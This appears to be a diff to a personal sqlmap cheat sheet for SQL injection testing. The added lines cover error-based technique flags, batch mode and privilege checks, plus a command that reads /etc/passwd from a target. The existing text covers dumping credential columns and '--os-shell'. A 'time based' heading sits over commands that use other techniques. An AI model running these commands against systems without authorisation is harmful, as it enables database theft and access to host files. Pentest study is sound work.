@@ -21,7 +21,7 @@ sqlmap -r REQUEST_FILE --force ssl # FOR HTTPS --risk 3 --level 5 --batch
 # for example Boolean or Union attack techniques 
 U # Union attack
 B # Boolean attack
-
+E # Error based
 
 -p # pramater 
 --risk --level # more aggresive attack
@@ -36,6 +36,7 @@ B # Boolean attack
 --force ssl # For https 
 --data # Login info
 --flush-session # delete saved info about old tests
+--batch # never ask for user input and use defaults
 ```
 
 # Flags after finding injectable parameter
@@ -53,6 +54,10 @@ B # Boolean attack
 --dump # dump database
 --current-db --dump # dump current used database
 --os-shell # Gain shell 
+
+--file-read= # If you have File permision on the target u can read files from the system
+--privilege # Checks ur permisions on the target
+
 ```
 
 
@@ -74,4 +79,22 @@ sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -D bl
 sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique U -D blogdb -T users -C username,password --dump # Dumps content of columns username and password
 
 ```
- 
+
+# For time based 
+
+```bash
+sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU 
+
+sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege
+
+
+```
+
+
+## if we have FILE privilege 
+that means we can read stuff from the system 
+```bash
+sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege
+
+sqlmap -r login.req --risk 3 --level 5 --batch --technique=BEU --privilege --file-read=/etc/passwd
+```
